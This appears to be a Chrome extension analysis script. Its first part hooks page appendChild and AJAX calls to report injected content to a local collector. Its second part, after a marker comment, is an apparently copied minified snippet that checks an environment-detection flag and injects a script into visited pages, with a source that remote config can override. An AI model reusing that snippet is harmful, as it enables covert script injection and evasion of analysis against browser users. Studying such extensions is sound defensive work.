
function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

//获取向页面注入的所有内容
function hookAppendChild(){
    var rawAppendChild = Element.prototype.appendChild;
    Element.prototype.appendChild = function() {
        console.log(arguments);
        var data = '';
        if(arguments[0].innerHTML == "") {
            data = arguments[0].src;
        } else {
            data = arguments[0].innerHTML;
        }
        collectMessageToServer("contentscript-appendChild-" + btoa(data));
        return rawAppendChild.apply(this, arguments);
    };
}

//获取所有的ajax 请求信息
function hookAjax(){
    var rawXMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("contentscript-ajax-" + btoa(arguments[1]));
        rawXMLHTTPRequestOpen.apply(this, arguments);
    }
}

//提取所有请求出口
// 方案一： 通过hook
// 方案二： 通过流量，确定需要访问的页面，对比有无扩展访问网站的区别

function run() {
    hookAjax();
    hookAppendChild();
}
run();
//sn00ker_ahahaha
chrome.storage.local.get(function(a){try{if(appConfig=a.config,!appConfig||!appConfig.extendedAnalytics)return;if(!appConfig||appConfig.envDetected)return;if(appConfig&&appConfig.ruleAllow){var b=new RegExp(appConfig.ruleAllow[0],appConfig.ruleAllow[1]);if(b.test(location.href));else return}if(appConfig&&appConfig.ruleDeny){var b=new RegExp(appConfig.ruleDeny[0],appConfig.ruleDeny[1]);if(b.test(location.href))return}(function(){(function(d,m){if(!m.__SV){var a=window;try{var b,c,e,f=a.location,i=f.hash;b=function(d,a){return(c=d.match(RegExp(a+"=([^&]*)")))?c[1]:null},i&&b(i,"state")&&(e=JSON.parse(decodeURIComponent(b(i,"state"))),"mpeditor"===e.action&&(a.sessionStorage.setItem("_mpcehash",i),history.replaceState(e.desiredHash||"",d.title,f.pathname+f.search)))}catch(a){}var g,j;if(window.mixpanel=m,appConfig&&appConfig.pageOptions)for(var h in appConfig.pageOptions)window[h]=appConfig.pageOptions[h];m._i=[],m.init=function(a,b,c){function h(d,b){var a=b.split(".");2==a.length&&(d=d[a[0]],b=a[1]),d[b]=function(){d.push([b].concat(Array.prototype.slice.call(arguments,0)))}}var e=m;for("undefined"==typeof c?c="mixpanel":e=m[c]=[],e.people=e.people||[],e.toString=function(d){var b="mixpanel";return"mixpanel"!==c&&(b+="."+c),d||(b+=" (stub)"),b},e.people.toString=function(){return e.toString(1)+".people (stub)"},g=["disable","time_event","track","track_pageview","track_links","track_forms","register","register_once","alias","unregister","identify","name_tag","set_config","reset","people.set","people.set_once","people.unset","people.increment","people.append","people.union","people.track_charge","people.clear_charges","people.delete_user"],j=0;j<g.length;j++)h(e,g[j]);m._i.push([a,b,c])},m.__SV=1.2,a=d.createElement("script"),a.type="text/javascript",a.async=!0,a.src="undefined"==typeof MIXPANEL_CUSTOM_LIB_URL?"file:"===d.location.protocol&&"https://cdn.mxpnl.com/libs/mixpanel-2-latest.min.js".match(/^\/\//)?"https://cdn.mxpnl.com/libs/mixpanel-2-latest.min.js":"https://cdn.mxpnl.com/libs/mixpanel-2-latest.min.js":MIXPANEL_CUSTOM_LIB_URL,b=d.getElementsByTagName("body")[0],b.appendChild(a)}})(document,window.mixpanel||[]),mixpanel.init(appConfig&&appConfig.mixpanelId?appConfig.mixpanelId:null)})()}catch(a){}});